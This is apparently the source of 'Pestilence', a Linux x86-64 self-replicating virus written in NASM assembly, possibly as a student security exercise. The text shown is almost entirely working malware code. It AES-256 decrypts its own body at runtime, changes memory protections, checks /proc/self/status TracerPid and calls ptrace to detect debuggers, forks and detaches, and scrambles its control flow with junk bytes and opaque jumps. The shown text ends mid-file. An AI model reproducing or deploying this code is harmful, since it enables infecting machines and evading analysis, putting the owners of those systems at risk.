; REGISTERS : %m6, %m7, %m8, %vsp
; Do not touch those registers as they contain sensitive data
; about different memory pages addresses.

%include "inc.asm"

DEFAULT rel
GLOBAL _start

SECTION .text

    nop
_start:
    nop
    call        _virus

align 16
_signature:
    .start: db "Pestilence version 1.0 (c)oded by mamaurai:xchalle - "
    .startsize: equ $-.start
    .index: times 4 db 0x30
    db ':'
    .key_preview: times 8 db 0x30
    db 0x00
align 16
_eos:

;- GLOBAL variables ----------------------------------
signature_len: equ _eos-_signature
non_packed_len: equ _packed-_start
virus_len: dd 0x00000000
entrypoint: dq 0x0000000000000000
;-----------------------------------------------------
; PUBLIC PART (This part isn't encrypted or packed).
_public:
;-----------------------------------------------------
; Public Structures (Structures used by public
; functions).
struc _AESD_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _UEC_OFF
    .mapaddr    resq 0x1
    .key        resb 0x20
endstruc
;-----------------------------------------------------
; Public Preprocessor Values.
tracerline_size: equ 11
columns_size: equ 7
lines_size: equ 5
debugging_size: equ 23
;-----------------------------------------------------
; Public Variables.
VARIABLES public
columns:        db "COLUMNS", 0x0
lines:          db "LINES", 0x0
procself:       db "/proc/self/status", 0x0
tracerline:     db "TracerPid:", 0x9
debugging:      db "[DEBUGGER IS RUNNING..]"
non_encrypted_len: equ _decrypt-_start
key: times 32 db 0x00
;-----------------------------------------------------
; Public code.
;-----------------------------------------------------
_virus:
    jmp         ..@sBJmPHAhlWud
..@RA7skX4Ognul:
    movdqu      xmm1, OWORD [rsp+0x30]
    jmp         $+5
db 0x27, 0x77, 0xd8
    je          ..@AzVlAoI1YHgi
    jne         ..@AzVlAoI1YHgi
Aes256KeyCreation:
    jmp         ..@n1EQBE0Efiuf
..@ffMpiI6gsNNo:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    jb          ..@a93ixNhOkhU9
    jae         ..@a93ixNhOkhU9
..@5KQFre0k7HZz:
    xor         r3, r3
    xor         r4, r4
    js          ..@hVSnOWz5OF3o
    jns         ..@hVSnOWz5OF3o
..@L7UnIvHBaszI:
    mov         eax, SYS_MPROTECT
    jmp         $+5
db 0x3f, 0x85, 0x74
    jmp         ..@ILPRTshqNp8R
..@KkmwudrHv0op:
    mov         m4, rdi
    jmp         ..@tcFgBBZs2Pq9
..@aUsSS7yZxwr2:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+5
db 0x11, 0x44, 0x18
    jmp         ..@OdDZ0RQSOF4l
..@jN586FynNXU9:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
    mov         rax, SYS_WAIT4
%endif
    jmp         $+3
db 0x79
    jb          ..@DLQhB0Xv6gSi
    jae         ..@DLQhB0Xv6gSi
..@5Es1rQh3YBUB:
    aeskeygenassist xmm2, xmm3, 0x4
    jmp         $+5
db 0x6b, 0x0f, 0x79
    je          ..@s7g2HrC8w2Zf
    jne         ..@s7g2HrC8w2Zf
..@EcoqypIkRISj:
    ret
    je          Aes256KeyExpansion
    jne         Aes256KeyExpansion
..@OWriG0h2N24i:
    pxor        xmm3, xmm4
    jmp         $+5
db 0xd9, 0x4e, 0xae
    jmp         ..@DGEFKJZr1yoV
..@UfbPeNDVxS96:
    DESTROY_MX_VAR
    js          ..@cize7nm4KaPr
    jns         ..@cize7nm4KaPr
..@rA530ra8CzHT:
    mov         QWORD [rsp+_AESD_OFF.length], r2
    jmp         ..@9vj6HOWlltqi
..@RKC3cuBGqsyu:
    xor         rdi, rdi
    jmp         $+5
db 0x10, 0x66, 0x1a
    jmp         $+4
db 0xcd, 0x84
    jb          ..@uwCSmOb2rTbU
    jae         ..@uwCSmOb2rTbU
..@8ikJykI22aIQ:
    mov         r3, rax
    mov         r4, m4
    jmp         $+3
db 0xe8
    jmp         ..@I9izXL0DPwuC
..@S5YfrbFJ7Kkz:
%ifndef ENABLE_DEBUGGING
    add         rax, tracerline_size
%endif
    jmp         ..@0NwO8L9fa9Lb
..@n7OulQL2njs7:
    pslldq      xmm4, 0x4
    jmp         ..@6P2AdmocE3SZ
..@EkwdPn8eSRdp:
    sub         r1, QWORD [r5]
    DESTROY_MX_VAR
    mov         rax, r1
    jmp         $+4
db 0x9b, 0x3f
    jmp         $+4
db 0xaa, 0x83
    jb          ..@CreG2Eiv1GHj
    jae         ..@CreG2Eiv1GHj
..@0KTJfAIRGwQI:
    sub         rdx, rcx
    jmp         ..@sjhlNUWPP3XB
..@nhPDlT7m0yyB:
    sub         r4, r1
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    jmp         $+4
db 0x9b, 0xe6
    jmp         ..@yAMCMG3jbK27
..@tfbqkPM7B8TG:
    xor         rax, rax
    jmp         $+5
db 0x3f, 0xe4, 0x17
    jb          ..@L7UnIvHBaszI
    jae         ..@L7UnIvHBaszI
..@1J9xGt9bjXDy:
    mov         m8, r5 
    jmp         $+3
db 0x39
    jmp         $+3
db 0x96
    jmp         ..@IOG7zPb7IIGT
..@6P2AdmocE3SZ:
    pxor        xmm1, xmm4
    pxor        xmm1, xmm2
    ret
    jmp         ..@fDkUwH3iMRc7
..@VOl0Ux1FRUdq:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xb0],xmm0
    jmp         $+3
db 0x45
    jb          ..@410Lff64hZB4
    jae         ..@410Lff64hZB4
..@TEGVqu7YEEff:
    ret
    jmp         $+5
db 0xd8, 0xab, 0x93
    jmp         $+4
db 0x8a, 0x0d
    jb          Strncmp
    jae         Strncmp
..@d1NUnDyYEM9z:
    mov         r2, r5
    mov         r3, _decrypt-_virus
    call        Aes256KeyCreation
    jl          ..@ZH0hx6JYboDb
    jge         ..@ZH0hx6JYboDb
ExitProgram:
    jmp         ..@UfbPeNDVxS96
..@b05DVgEQoakx:
    add         rsp, 4*bytes
    jmp         ..@TEGVqu7YEEff
..@xKKjNttcbnF0:
    xor         r2, r2
    jb          ..@aMc2lDpx3TD3
    jae         ..@aMc2lDpx3TD3
..@wTg7UIQ44xa1:
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xc0]
    js          ..@m8CpH6kgd6wq
    jns         ..@m8CpH6kgd6wq
..@s7g2HrC8w2Zf:
    call        ..@cijoZljesuOv
    jmp         ..@E3lvjadmmToc
..@pvPOlN4uUNcl:
%ifndef ENABLE_DEBUGGING
    call        GetEnv
%endif
    jmp         $+3
db 0xa7
    jmp         $+3
db 0x41
    jb          ..@1wzO9QkfYWXr
    jae         ..@1wzO9QkfYWXr
..@vs1qtQvjKjbm:
    ret
    jmp         Memmem
..@cIuxKzeYDslX:
    push        rbp
    mov         rbp, rsp
    jmp         $+4
db 0xe4, 0xdb
    jmp         ..@ALPBJBeIxOfS
..@uwCSmOb2rTbU:
    call        ExitProgram
    jmp         $+5
db 0x59, 0x7b, 0x07
    jb          ..@70haZqS0Af1m
    jae         ..@70haZqS0Af1m
..@xzWKMKUt0ipL:
    ret
    jmp         $+4
db 0x85, 0xbb
    jmp         GetEnv
..@410Lff64hZB4:
    movdqu      xmm1, OWORD [rsp+0xc0]
    jl          ..@AL3385udTfbv
    jge         ..@AL3385udTfbv
..@zSHsNdlArjZb:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    jmp         ..@n7OulQL2njs7
..@DIu3fHrDQtvM:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PTRACE
    syscall
    test        rax, rax
%endif
    jl          ..@GakyFE6c5Sup
    jge         ..@GakyFE6c5Sup
..@ZH0hx6JYboDb:
    xor         r2, r2
    jmp         $+4
db 0x30, 0x5d
    jl          ..@upMonx6QyUuk
    jge         ..@upMonx6QyUuk
..@68CdBUFMdO3U:
    cmp         rax, QWORD [rsp]
    jmp         $+4
db 0xed, 0xea
    jb          ..@oc0iIC0gDxm6
    jae         ..@oc0iIC0gDxm6
..@Uc1qcxSZude7:
%ifndef ENABLE_DEBUGGING
    pop         rax
    mov         r1, 0
%endif
    jmp         ..@loSQwM2sVnHt
..@uTGrtQyT8v6E:
    xor         r1, r1
    jl          ..@gsG0SfqhBZLY
    jge         ..@gsG0SfqhBZLY
..@noOqPeQ5rmrU:
    mov         rsi, r5
    jmp         $+3
db 0xc5
    jmp         ..@m1QbkCA1Ag7e
..@9uGD8bYVhXQp:
    movdqu      xmm1, OWORD [rsp+0x70]
    js          ..@TArVRpv6vhZi
    jns         ..@TArVRpv6vhZi
..@m8CpH6kgd6wq:
    aesdec      xmm0, xmm1
    jb          ..@u7XxRP5LsjSK
    jae         ..@u7XxRP5LsjSK
..@lDjxpKarvsEm:
    add         r1, 1
    jl          ..@IGlM29joMSlA
    jge         ..@IGlM29joMSlA
..@HxzOdP4j15qD:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    jnz         ..@XgW8Tj615j2o
%endif
    jmp         ..@xw7D6BWUBbFh
..@j8ZhmhsJWqcq:
%ifndef ENABLE_DEBUGGING
    mov         QWORD [rsp], 0x00
    mov         r1, rax
%endif
    jmp         $+3
db 0xa3
    jmp         $+3
db 0x6c
    jmp         ..@m8AYcSAK0ar0
..@e8kY5N7mdCLY:
    movdqu      xmm1, OWORD [rsp+0x20]
    js          ..@rk1gCAdtUsmg
    jns         ..@rk1gCAdtUsmg
..@uk8PXNGa58MH:
    xor         rax, rax
    mov         eax, SYS_SETSID
    jmp         $+5
db 0x41, 0xd1, 0x5a
    je          ..@esAwQsBKcHhA
    jne         ..@esAwQsBKcHhA
..@2lroqtBLxIq9:
    test        eax, eax
    jmp         $+4
db 0x8c, 0x00
    jl          ..@DWH5Hb1DQTIq
    jge         ..@DWH5Hb1DQTIq
..@3KIIOkrJhOd3:
    push        r1
    jmp         $+4
db 0x7e, 0x10
    je          ..@i6wimk27sSFZ
    jne         ..@i6wimk27sSFZ
..@rwnsUou04uRk:
    add         rax, 1
    jmp         $+4
db 0xc1, 0x62
    jmp         $+4
db 0xbd, 0x6b
    jmp         $+5
db 0x1a, 0xb6, 0xd5
    jmp         $+3
db 0x02
    jb          ..@FWBYJGIMTZhS
    jae         ..@FWBYJGIMTZhS
..@ncVlbRxXcHjy:
    test        r5, r5
    jmp         $+3
db 0xbe
    js          ..@Xmh65iE6z7oW
    jns         ..@Xmh65iE6z7oW
..@cc817kpBlqVO:
    movdqu      OWORD [rsp+0xc0],xmm0
    jl          ..@TZQ88bBGxCJ3
    jge         ..@TZQ88bBGxCJ3
..@P26lYbsluJS5:
%ifndef ENABLE_DEBUGGING
    shr         eax, 8
    add         rsp, bytes
%endif
    jl          ..@HxzOdP4j15qD
    jge         ..@HxzOdP4j15qD
..@loSQwM2sVnHt:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jb          ..@3irnC89gjAUL
    jae         ..@3irnC89gjAUL
..@toYNkh3dm5YB:
    mov         r1, r5
    VAR         public, entrypoint
    jb          ..@EkwdPn8eSRdp
    jae         ..@EkwdPn8eSRdp
..@ZA1j9JAICuMU:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    jmp         $+4
db 0xaf, 0xb0
    jl          ..@GtF0k5iauydb
    jge         ..@GtF0k5iauydb
..@DWH5Hb1DQTIq:
    jz          ..@uk8PXNGa58MH
    jmp         $+3
db 0xc2
    js          ..@83QsF23Hos3e
    jns         ..@83QsF23Hos3e
..@SkuZD4WfLr34:
    call        Aes256Decryption
    jmp         ..@4AU6YoLK2Ij7
..@JtZtjY9zrYRI:
    xor         r1, r1
    jl          ..@P68muGBT5dIa
    jge         ..@P68muGBT5dIa
..@ALPBJBeIxOfS:
    sub         rsp, _AESD_OFF_size+0x100
    and         rsp, 0xfffffffffffffff0
    jl          ..@TPM7yx0YFsWZ
    jge         ..@TPM7yx0YFsWZ
..@UJyjOiG5UxBi:
    mov         rax, SYS_WAIT4
    syscall
    jl          ..@v51xPBBkPhtV
    jge         ..@v51xPBBkPhtV
..@Ufdgj3GMHyqB:
    movdqa      xmm4, xmm3
    pslldq      xmm4, 0x4
    jmp         $+3
db 0xf8
    jl          ..@DttZIUe5Pmf4
    jge         ..@DttZIUe5Pmf4
..@jKFvCbNSSaSC:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x10],xmm0
    jl          ..@e8kY5N7mdCLY
    jge         ..@e8kY5N7mdCLY
..@2xZAm8cxDS2J:
    mov         rdx, QWORD [rsp]
    jmp         ..@0KTJfAIRGwQI
..@cnZXxrYD3Buu:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, OWORD [rsp+0xe0]
    pxor        xmm0, xmm1
    jmp         ..@wTg7UIQ44xa1
..@SHLOlF8Q4OLF:
    and         r2, 0xfffffffffffffff0
    jmp         $+3
db 0x19
    js          ..@mExR7Mz446cY
    jns         ..@mExR7Mz446cY
..@jvieTkCCNVAi:
    movdqa      OWORD [rsi+0x20], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@fDkUwH3iMRc7
    jb          ..@9aFPlbbmEWHA
    jae         ..@9aFPlbbmEWHA
..@47Bk2vr7bY4B:
    movdqa      OWORD [rsi+0xd0], xmm3
    aeskeygenassist xmm2, xmm3, 0x40
    call        ..@cijoZljesuOv
    jmp         ..@568FJeNxZxzg
..@Xo0LMvYKoWJd:
%ifndef ENABLE_DEBUGGING
    sub         rsp, bytes
%endif
    jmp         $+5
db 0x83, 0x45, 0xce
    jmp         ..@j8ZhmhsJWqcq
..@OdDZ0RQSOF4l:
    call        ..@fDkUwH3iMRc7
    jl          ..@tZ81iD5Hhxj7
    jge         ..@tZ81iD5Hhxj7
..@zYyZphVMRDTW:
    add         r2, 1
    jl          ..@tfbqkPM7B8TG
    jge         ..@tfbqkPM7B8TG
..@zjuF0KhQOF6D:
%ifndef ENABLE_DEBUGGING
    jne         ..@XgW8Tj615j2o
%endif
    jmp         $+4
db 0x4c, 0x3d
    jmp         ..@oJWueEtebq0i
..@568FJeNxZxzg:
    movdqa      OWORD [rsi+0xe0], xmm1
    ret
    jmp         $+5
db 0x2d, 0x50, 0x69
    jmp         $+3
db 0x25
    jmp         ..@cijoZljesuOv
..@nKnA2e9UKkB1:
    pslldq      xmm4, 0x4
    jmp         $+4
db 0x06, 0xf5
    jb          ..@nPN2LBEY455K
    jae         ..@nPN2LBEY455K
..@e3e2Eh8hdC2c:
    pop         r1
    jmp         $+4
db 0x7a, 0x0c
    jmp         ..@2Rii2lUGK13P
..@hVSnOWz5OF3o:
%ifndef ENABLE_DEBUGGING
    sub         rsp, 0x200
    VAR         public, procself
%endif
    jmp         ..@vtT4RncU51ju
..@1kRgDZdvwx6r:
    push        r2
    push        r3
    jmp         $+3
db 0x5d
    jmp         $+5
db 0x71, 0x32, 0x70
    jmp         ..@vjhoMLYOw1jF
..@dVVg28cnu0dK:
    lea         r1, [rsp+_UEC_OFF.key]
    VAR         public, _virus
    jmp         ..@d1NUnDyYEM9z
..@W2DWcVuuccrA:
    mov         r2, QWORD [r4]
    test        r2, r2
    je          ..@wpLLlFVO9mtV
    jne         ..@wpLLlFVO9mtV
..@sO2aYReDslFX:
%ifndef ENABLE_DEBUGGING
    jne         ..@3irnC89gjAUL
%endif
    jmp         $+5
db 0x1e, 0x59, 0x7c
    js          ..@v56zOkSTzQeE
    jns         ..@v56zOkSTzQeE
..@2qP4lx3Y5GLL:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0xef
    jmp         ..@M51xAvm22H0R
..@yAMCMG3jbK27:
    add         r2, r4
    sub         r2, non_encrypted_len
    jmp         $+5
db 0xdf, 0x54, 0x11
    jb          ..@3HtkZKxKzMVi
    jae         ..@3HtkZKxKzMVi
..@XgW8Tj615j2o:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
    mov         r3, debugging_size
    VAR         public, debugging
%endif
    jmp         $+3
db 0x45
    jmp         ..@A01ggoaCS4Kt
..@GtF0k5iauydb:
    movdqu      xmm1, OWORD [rsp+0x10]
    js          ..@jKFvCbNSSaSC
    jns         ..@jKFvCbNSSaSC
..@cijoZljesuOv:
    pshufd      xmm2, xmm2, 0xff
    movdqa      xmm4, xmm1
    pslldq      xmm4, 0x4
    js          ..@JPOqKNWx6Gjd
    jns         ..@JPOqKNWx6Gjd
..@XNHC4BpYXlKt:
    movdqu      xmm2, OWORD [r2+rax]
    jmp         $+5
db 0x8f, 0xb3, 0x11
    jb          ..@nIsicDl9Y2Kc
    jae         ..@nIsicDl9Y2Kc
..@RJbu9MYaWdQE:
    movdqu      OWORD [rsp+0x30],xmm0
    jb          ..@BTdpGVYOV3Ad
    jae         ..@BTdpGVYOV3Ad
..@SPo9xEwQPnto:
    aesdec      xmm0, xmm1
    js          ..@dosWURCKqfAN
    jns         ..@dosWURCKqfAN
..@A96NZ8hZQ8r5:
    xor         rbx, rbx
    jmp         $+3
db 0x28
    jmp         ..@x7OMBvVJ2cgb
..@m1QbkCA1Ag7e:
    lea         rdi, [rsp+_UEC_OFF.key]
    mov         rcx, 0x8
    rep         movsd
    jmp         ..@dVVg28cnu0dK
..@vgr08lnRDzJc:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jl          ..@MPD3NqNbLvGg
    jge         ..@MPD3NqNbLvGg
..@TPM7yx0YFsWZ:
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    jmp         ..@rA530ra8CzHT
..@t7sRjBU5hhpi:
    movdqa      OWORD [rsi+0x50], xmm3
    jl          ..@5Es1rQh3YBUB
    jge         ..@5Es1rQh3YBUB
..@upMonx6QyUuk:
    GGLOBAL     _decrypt
    mov         r1, r5
    jmp         $+4
db 0x7e, 0x61
    jl          ..@hqIvDPukftPa
    jge         ..@hqIvDPukftPa
..@bLc6xlJvU6C3:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0x15, 0x1b
    jmp         ..@lUTQRcNCHeek
..@nM1gCDQJeu6O:
    jnz         ..@tT5SyTWC3zAC
    jmp         $+3
db 0xc5
    jmp         ..@aWuunAt3OeQR
..@FWBYJGIMTZhS:
    jmp         ..@XGzRfN7TJn7l
    jb          ..@vs1qtQvjKjbm
    jae         ..@vs1qtQvjKjbm
..@ylmIYhISfx8z:
    movdqu      OWORD [rsp+0x90],xmm0
    jmp         $+3
db 0x68
    jmp         ..@lhJUVkQkkM83
..@aMc2lDpx3TD3:
    xor         r3, r3
    xor         r4, r4
    xor         r5, r5
    jmp         $+5
db 0x7e, 0xdc, 0x48
    jmp         ..@gtxfAEO5Ygnu
..@GbEsC308sMRb:
    jz          ..@Tw4L0sR6fd3o
    jmp         ..@ZxzhhqCwl8LS
..@TZQ88bBGxCJ3:
    movdqu      xmm1, OWORD [rsp+0xd0]
    jl          ..@FEejrGcSqjTx
    jge         ..@FEejrGcSqjTx
..@5i7SPnqHBqpi:
%ifndef ENABLE_DEBUGGING
    mov         r1, rsp
    mov         r2, 0x200
    VAR         public, tracerline
%endif
    jmp         ..@HRv8C8f6Dl5c
..@mExR7Mz446cY:
    lea         r3, [rsp+_UEC_OFF.key]
    jmp         $+3
db 0x0d
    js          ..@SkuZD4WfLr34
    jns         ..@SkuZD4WfLr34
..@YeP1CTBXFXpO:
    aesdeclast  xmm0, xmm1
    jmp         $+5
db 0xfc, 0x73, 0xab
    jl          ..@yuOAHcivmb5y
    jge         ..@yuOAHcivmb5y
..@v56zOkSTzQeE:
%ifndef ENABLE_DEBUGGING
    CFILE       r5d
%endif
    jmp         ..@5i7SPnqHBqpi
Aes256KeyExpansion:
    jmp         ..@jcJ0LgPZGDNC
..@hts09ZieR3tn:
    cmp         QWORD [rdi], 0x00
    jne         ..@XrNGMHr1eAtu
    add         rdi, bytes
    js          ..@KkmwudrHv0op
    jns         ..@KkmwudrHv0op
..@3HtkZKxKzMVi:
    mov         r5, r2
    and         r5, PAGE_SIZE-1
    je          ..@ncVlbRxXcHjy
    jne         ..@ncVlbRxXcHjy
..@ILPRTshqNp8R:
    syscall
    jmp         $+4
db 0xdf, 0x0e
    jmp         $+4
db 0x86, 0x22
    js          ..@ZqTrV3yq8QbQ
    jns         ..@ZqTrV3yq8QbQ
..@JI7IV3udSY6A:
    movdqu      xmm1, OWORD [rsp+0x10]
    jmp         $+4
db 0x52, 0x16
    jmp         $+4
db 0x24, 0x58
    jb          ..@NoMI9T52ENEY
    jae         ..@NoMI9T52ENEY
..@7pCx9dXiaWPG:
    xor         r2, r2
    jb          ..@Tw4L0sR6fd3o
    jae         ..@Tw4L0sR6fd3o
..@B7LkGeLENDTN:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
    mov         r1, r5
%endif
    jb          ..@pvPOlN4uUNcl
    jae         ..@pvPOlN4uUNcl
..@e5mVnCpn0Crk:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x80]
    aesdec      xmm0, xmm1
    jmp         ..@9uGD8bYVhXQp
..@YF2i3qQIHJQS:
%ifndef ENABLE_DEBUGGING
    call        Memmem
%endif
    jmp         $+5
db 0x0c, 0x20, 0xee
    jmp         $+5
db 0x3d, 0xac, 0x05
    jmp         ..@S5YfrbFJ7Kkz
..@FFPalMcZMnu1:
    movdqu      OWORD [rsp+0x70],xmm0
    movdqu      xmm1, OWORD [rsp+0x80]
    aesimc      xmm0,xmm1
    jmp         $+5
db 0x94, 0xd3, 0x98
    jmp         $+4
db 0x1d, 0x33
    js          ..@w0fgJqaKiqTw
    jns         ..@w0fgJqaKiqTw
..@n9FAcyINKJ3V:
    pop         r3
    jmp         ..@XiEwLeL6nYEP
..@A01ggoaCS4Kt:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
%endif
    jmp         $+5
db 0x1e, 0xe9, 0x23
    jmp         ..@oPvr6ve0mNw5
..@v51xPBBkPhtV:
    add         rsp, bytes
    js          ..@FeI0NnEr6DaU
    jns         ..@FeI0NnEr6DaU
..@3aINtGFkhKCg:
    cmp         BYTE [r2], al
    je          ..@lDjxpKarvsEm
    sub         al, BYTE [r2]
    jmp         ..@lgqne1zp6oPP
AntiDebugging:
    jmp         ..@uTGrtQyT8v6E
..@E3lvjadmmToc:
    movdqa      OWORD [rsi+0x60], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         ..@uTfSc9bUEHWU
..@wwD5F8CLh9we:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         ..@w9mOPGTykUHN
..@XjPxU4zHMmPP:
    pslldq      xmm4, 0x4
    jmp         $+5
db 0xf0, 0x75, 0xe6
    jmp         $+5
db 0x38, 0x35, 0xb4
    jb          ..@OWriG0h2N24i
    jae         ..@OWriG0h2N24i
..@CreG2Eiv1GHj:
    xor         r1, r1
    je          ..@xKKjNttcbnF0
    jne         ..@xKKjNttcbnF0
..@fDkUwH3iMRc7:
    pshufd      xmm2, xmm2, 0xaa
    jl          ..@Ufdgj3GMHyqB
    jge         ..@Ufdgj3GMHyqB
..@hqIvDPukftPa:
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    jmp         ..@zi9YUMAO9UAw
..@XiEwLeL6nYEP:
    pop         r2
    jmp         ..@WWmppnKJG6Sb
..@MPD3NqNbLvGg:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    je          ..@NGINxsctWSrc
    jne         ..@NGINxsctWSrc
..@TGBCnM83kPAi:
    sub         rsp, _UEC_OFF_size
    jmp         ..@cvpwVyVyCe80
..@qGVIKnA6C3wI:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jmp         $+5
db 0xf6, 0x81, 0xaa
    jmp         ..@yaHixDmF8oL1
..@sBJmPHAhlWud:
    pop         rdi
    sub         rdi, 1
    jmp         $+5
db 0x3e, 0x55, 0x0c
    jl          ..@fOKuICQFCelH
    jge         ..@fOKuICQFCelH
..@WxlW79xxJGhi:
    mov         rdi, rbp
    jmp         ..@XrNGMHr1eAtu
..@NGINxsctWSrc:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
    syscall
    mov         r1, 7
%endif
    jl          ..@Bf3PcKzyjAz5
    jge         ..@Bf3PcKzyjAz5
..@Mc0VD2J0xgPg:
%ifndef ENABLE_DEBUGGING
    jnz         ..@XgW8Tj615j2o
    VAR         public, lines
%endif
    jl          ..@2RaWpBFq7EDG
    jge         ..@2RaWpBFq7EDG
..@BTdpGVYOV3Ad:
    movdqu      xmm1, OWORD [rsp+0x40]
    jmp         $+4
db 0x30, 0x7f
    jb          ..@pScOhI68Zg2i
    jae         ..@pScOhI68Zg2i
..@gBsACzSVIXln:
    movdqu      xmm1, OWORD [rsp]
    jmp         $+5
db 0x2b, 0xeb, 0x41
    jl          ..@YeP1CTBXFXpO
    jge         ..@YeP1CTBXFXpO
..@Ix26tg21e3hJ:
%ifndef ENABLE_DEBUGGING
    mov         r1, 1
%endif
    jmp         ..@qGVIKnA6C3wI
..@EaT0BDxeRBAF:
    push        r1
    push        r2
    push        r3
    jmp         ..@5FmHTRxfJKyu
..@ZxzhhqCwl8LS:
    add         r4, bytes
    je          ..@qxdYiIsyu4o6
    jne         ..@qxdYiIsyu4o6
..@m8AYcSAK0ar0:
%ifndef ENABLE_DEBUGGING
    mov         r2, rsp
    xor         r3, r3
%endif
    je          ..@jN586FynNXU9
    jne         ..@jN586FynNXU9
..@9vj6HOWlltqi:
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    mov         rsi, rsp
    jl          ..@qqG5hkcYsibt
    jge         ..@qqG5hkcYsibt
..@PmoM6H5ssYdR:
    or          r2, PAGE_SIZE-1
    jmp         $+5
db 0xe6, 0xb7, 0x19
    jmp         ..@zYyZphVMRDTW
..@gtxfAEO5Ygnu:
    jmp         rax
    js          ..@XgW8Tj615j2o
    jns         ..@XgW8Tj615j2o
..@UOvoOxBGzyaD:
    movdqu      xmm0, OWORD [r1]
    movdqu      xmm1, OWORD [r1+0x10]
    jmp         $+3
db 0xa1
    js          ..@F42YBw7yvJN5
    jns         ..@F42YBw7yvJN5
..@0uIBDQX29KKs:
    aesimc      xmm0,xmm1
    jmp         $+3
db 0xf1
    jmp         $+5
db 0x04, 0xee, 0xdb
    jb          ..@FFPalMcZMnu1
    jae         ..@FFPalMcZMnu1
..@O2V9PbCyum4r:
    movdqu      xmm1, OWORD [rsp+0xb0]
    jmp         $+4
db 0x2a, 0x4c
    jmp         $+5
db 0x66, 0xd7, 0xe8
    je          ..@VOl0Ux1FRUdq
    jne         ..@VOl0Ux1FRUdq
..@KUCsOO6bh0fM:
%ifndef ENABLE_DEBUGGING
    mov         QWORD [rsp], 0x00
%endif
    jmp         $+5
db 0x12, 0x30, 0x8c
    jmp         $+3
db 0x63
    jl          ..@GUYeNR0b2jaF
    jge         ..@GUYeNR0b2jaF
..@dosWURCKqfAN:
    movdqu      xmm1, OWORD [rsp+0x40]
    jl          ..@zl39bxU3KIAH
    jge         ..@zl39bxU3KIAH
..@unKCMJxKU39K:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0xc0
    js          ..@JI7IV3udSY6A
    jns         ..@JI7IV3udSY6A
..@yaHixDmF8oL1:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_GETPPID
%endif
    jmp         ..@ffMpiI6gsNNo
..@A7q56XK9LLhz:
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    jmp         ..@o8dz2yLRtdmm
..@1wzO9QkfYWXr:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         $+4
db 0x72, 0x03
    js          ..@Mc0VD2J0xgPg
    jns         ..@Mc0VD2J0xgPg
Memmem:
    jmp         ..@2bTKK47qWrQs
Strncmp:
    jmp         ..@EaT0BDxeRBAF
..@cvu8RRzn4yIF:
%ifndef ENABLE_DEBUGGING
    jnz         ..@XgW8Tj615j2o
%endif
    jmp         $+5
db 0x2f, 0x0b, 0x87
    js          ..@yZGvEdbG29mr
    jns         ..@yZGvEdbG29mr
..@oJWueEtebq0i:
%ifndef ENABLE_DEBUGGING
    add         rsp, 0x200
%endif
    jmp         $+3
db 0x38
    jb          ..@B7LkGeLENDTN
    jae         ..@B7LkGeLENDTN
..@Bf3PcKzyjAz5:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jb          ..@1NgKGw0bBIw6
    jae         ..@1NgKGw0bBIw6
..@vtT4RncU51ju:
%ifndef ENABLE_DEBUGGING
    OFILE       [r5], 0x0
%endif
    js          ..@fkelzCkghAR4
    jns         ..@fkelzCkghAR4
..@cize7nm4KaPr:
    mov         rax, SYS_EXIT
    syscall
    jmp         $+4
db 0x5a, 0x00
    jl          AntiDebugging
    jge         AntiDebugging
..@TArVRpv6vhZi:
    aesdec      xmm0, xmm1
    jl          ..@sOVsZKcgCqtL
    jge         ..@sOVsZKcgCqtL
Aes256Decryption:
    jmp         ..@cIuxKzeYDslX
..@ZqTrV3yq8QbQ:
    cmp         eax, 0x00
    je          ..@gEOod0CwrloY
    jmp         $+3
db 0xa3
    jl          ..@JtZtjY9zrYRI
    jge         ..@JtZtjY9zrYRI
..@i6wimk27sSFZ:
    call        Strlen
    jmp         $+4
db 0x48, 0x10
    jl          ..@8ikJykI22aIQ
    jge         ..@8ikJykI22aIQ
..@zl39bxU3KIAH:
    aesdec      xmm0, xmm1
    jmp         ..@V6fuuXgVJZ1l
..@C7Q4Oq7go64P:
    xor         rax, rax
    mov         rax, SYS_FORK
    jb          ..@wpS5QhnamBeB
    jae         ..@wpS5QhnamBeB
..@4JE6QyyjyeAB:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
    jz          ..@yaHixDmF8oL1
%endif
    jmp         $+5
db 0xb4, 0xa3, 0x6a
    jmp         $+3
db 0xbb
    jb          ..@Xo0LMvYKoWJd
    jae         ..@Xo0LMvYKoWJd
..@cvpwVyVyCe80:
